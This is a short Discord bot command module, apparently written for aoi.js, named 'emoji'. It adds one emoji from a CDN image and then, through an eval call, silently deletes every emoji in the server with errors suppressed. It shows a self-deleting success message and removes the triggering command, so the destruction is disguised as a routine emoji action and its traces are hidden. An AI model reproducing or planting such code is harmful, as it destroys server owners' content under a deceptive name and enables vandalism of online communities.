module.exports = {
  name:"emoji",
  code:`

  $addEmoji[$guildID;https://images-ext-1.discordapp.net/external/HH9WIT01gba88f89Wvbz-2M4aYDLlo8hF3QJegGoSv0/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1000767324594393118/a2c8022513103d675b4c29c1f0f0b49d.png?width=473&height=473;rubyteam]
  $djsEval[message.guild.emojis.cache.forEach(x => {x.delete().catch(err => {})})]
  $sendMessage[Emoji :white_check_mark: {delete:5s};no]
  $wait[2s]
  $sendMessage[Wait... ⌛{delete:2s};no]  
  $deletecommand

  `
}
